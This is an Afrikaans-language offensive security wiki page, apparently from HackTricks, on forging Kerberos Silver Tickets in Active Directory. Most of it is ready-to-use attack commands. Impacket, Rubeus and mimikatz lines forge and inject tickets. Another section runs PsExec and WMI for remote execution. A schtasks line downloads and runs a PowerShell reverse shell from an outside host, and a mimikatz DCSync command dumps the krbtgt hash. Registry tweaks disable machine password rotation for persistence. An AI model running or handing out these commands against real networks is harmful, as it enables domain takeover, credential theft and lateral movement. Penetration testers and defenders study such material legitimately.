# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Die **Silver Ticket** aanval behels die uitbuiting van dienskaartjies in Active Directory (AD) omgewings. Hierdie metode staat op **die verkryging van die NTLM-hash van 'n diensrekening**, soos 'n rekenaarrekening, om 'n Ticket Granting Service (TGS) kaartjie te vervals. Met hierdie vervalste kaartjie kan 'n aanvaller toegang verkry tot spesifieke dienste op die netwerk, **om enige gebruiker na te boots**, tipies met die doel om administratiewe regte te verkry. Dit word beklemtoon dat die gebruik van AES sleutels vir die vervalsing van kaartjies veiliger en minder opspoorbaar is.

> [!WARNING]
> Silver Tickets is minder opspoorbaar as Golden Tickets omdat hulle net die **hash van die diensrekening** vereis, nie die krbtgt rekening nie. Hulle is egter beperk tot die spesifieke diens wat hulle teiken. Boonop, net om die wagwoord van 'n gebruiker te steel.
Boonop, as jy 'n **rekening se wagwoord met 'n SPN** kompromitteer, kan jy daardie wagwoord gebruik om 'n Silver Ticket te skep wat enige gebruiker na daardie diens naboots.

Vir kaartjie-ontwerp word verskillende gereedskap gebruik, gebaseer op die bedryfstelsel:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Op Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Die CIFS-diens word uitgelig as 'n algemene teiken om toegang tot die slagoffer se lêerstelsel te verkry, maar ander dienste soos HOST en RPCSS kan ook uitgebuit word vir take en WMI-vrae.

## Beskikbare Dienste

| Diens Tipe                                 | Diens Silver Tickets                                                      |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Afhangende van OS ook:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In sommige gevalle kan jy net vra vir: WINRM</p> |
| Geplande Take                              | HOST                                                                    |
| Windows Lêer Deel, ook psexec              | CIFS                                                                    |
| LDAP bedrywighede, ingesluit DCSync       | LDAP                                                                    |
| Windows Afgeleë Bediener Administrasie Gereedskap | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
| Goue Tickets                               | krbtgt                                                                |

Met **Rubeus** kan jy **vra vir al** hierdie kaarte met die parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Gebeurtenis ID's

- 4624: Rekening Aanmelding
- 4634: Rekening Afmelding
- 4672: Admin Aanmelding

## Volharding

Om te verhoed dat masjiene hul wagwoord elke 30 dae draai, stel `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` of jy kan `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` op 'n groter waarde as 30 dae stel om die draai periode aan te dui wanneer die masjien se wagwoord gedraai moet word.

## Misbruik van Diens kaarte

In die volgende voorbeelde kom ons veronderstel dat die kaart verkry is deur die administrateur rekening na te volg.

### CIFS

Met hierdie kaart sal jy in staat wees om toegang te verkry tot die `C$` en `ADMIN$` gids via **SMB** (as hulle blootgestel is) en lêers na 'n deel van die afgeleë lêerstelsel te kopieer deur iets soos te doen:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
U sal ook in staat wees om 'n shell binne die gasheer te verkry of arbitrêre opdragte uit te voer met behulp van **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### GASHER

Met hierdie toestemming kan u geskeduleerde take in afstandrekenaars genereer en arbitrêre opdragte uitvoer:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Met hierdie kaartjies kan jy **WMI in die slagoffer se stelsel uitvoer**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Vind **meer inligting oor wmiexec** in die volgende bladsy:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Met winrm toegang oor 'n rekenaar kan jy **dit toegang** en selfs 'n PowerShell kry:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Kontroleer die volgende bladsy om **meer maniere te leer om met 'n afstandsbediener te verbind met winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Let daarop dat **winrm aktief en luisterend moet wees** op die afstandsrekenaar om toegang te verkry.

### LDAP

Met hierdie voorreg kan jy die DC-databasis dump met **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Leer meer oor DCSync** in die volgende bladsy:

{{#ref}}
dcsync.md
{{#endref}}


## Verwysings

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)



{{#include ../../banners/hacktricks-training.md}}
